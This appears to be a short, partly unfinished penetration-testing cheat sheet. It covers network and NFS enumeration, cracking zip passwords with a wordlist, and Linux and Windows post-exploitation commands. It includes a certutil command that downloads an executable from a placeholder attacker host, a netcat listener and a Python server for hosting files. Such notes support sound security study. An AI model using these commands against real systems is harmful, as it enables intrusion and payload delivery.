## Enumeration 
arp-scan -l

showmount -e <server ip>
mount -t nfs <server ip>:<remote path shown from showmount> <to local mount point>

nmap -sV -A -T4 -p- 
nmap --sC ? 

gobuster ######

## Cracking
Zip files: fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt <target.zip>

## Linux Post Exploitation
history
pwd
sudo -l
crontab -l

## Windows Post Exploitation
cd
whoami
ipconfig
dir
sc stop <application>
sc start <application>
sc query <application>
certutil.exe -urlcache -f http://<attackerip>:8000/<application.exe> <applicationname.exe>

## Listener
nc -nlvp

## Directory hosting
python -m SimpleHTTPServer

## Linux wget and curl commands

## Windows Certutil commands

